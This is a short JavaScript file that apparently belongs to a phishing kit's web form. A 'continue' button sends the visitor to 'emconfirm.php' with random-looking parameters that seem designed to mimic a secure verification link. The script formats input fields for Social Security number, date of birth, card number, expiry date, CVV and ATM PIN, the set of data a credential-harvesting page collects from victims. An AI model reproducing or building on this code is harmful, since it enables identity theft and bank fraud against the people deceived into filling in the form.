// JavaScript Document

(function(){
	
	$('.continue').on('click', function(){
		window.location.href= "emconfirm.php?&sslem=98s69d87adakjbdsa8d6asdkjbbmbmnbnvngchgas&username=lisjds98a743uyvjasdbkasd";
	});
	
	
	
	
	function ajustStyle(width){
		width = parseInt(width);
		if(width < 400){
			$('#mystyle').attr('href','css/1.css');
			console.log('mobile style sheet applied ' + $(window).width());
		}else if(width < 601){
			$('#mystyle').attr('href','css/2.css');
			console.log('medium style sheet applied ' + $(window).width());
		}else if (width < 941){
			$('#mystyle').attr('href','css/3.css');
			console.log('semi wide style sheet applied  ' + $(window).width());
		}else if (width < 1600){
			$('#mystyle').attr('href','css/4.css');
			console.log('wide style sheet applied  ' + $(window).width());
		}
	}
	ajustStyle($(this).width());
	$(window).resize(function() {
        ajustStyle($(this).width());
		$('.map2').css('width',$(this).width());
    });			
	
	$('#ssn').mask('0000-00-000');
	$('#dob').mask('00/00/0000');
	$('#cardnumber').mask('0000-0000-0000-0000');
	$('#expdate').mask('00/0000');
	$('#zipcode').mask('00000');
	$('#cvv').mask('000');	
	$('#atmpin').mask('0000');	
	$('#phonenumber').mask('000-000-0000');
	
	
})()